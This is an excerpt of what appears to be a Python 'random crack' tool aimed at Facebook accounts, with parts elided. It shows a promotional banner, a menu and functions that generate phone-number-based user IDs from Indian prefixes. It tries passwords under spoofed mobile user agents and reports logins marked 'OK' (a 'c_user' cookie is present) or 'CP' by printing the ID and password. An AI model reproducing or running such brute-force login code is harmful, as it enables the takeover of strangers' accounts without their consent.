...
os.system("xdg-open https://www.youtube.com/@FFSTRGAMER")
#app  check 
...
\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34mOWNER SANJEET
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36mSANJEET MAURYA
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37mSANJEET-404
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34mTOOL IS FREE
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36m🤟🥰SANJEET☝️😍
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/TheKingOfBihar8097")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 6299,9871,6383,8795,7667")
	print(47*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[SANJEET -OK] '+uid+' | '+ps)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
		...
		sys.stdout.write('\r\33[1;37m[SANJEET-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
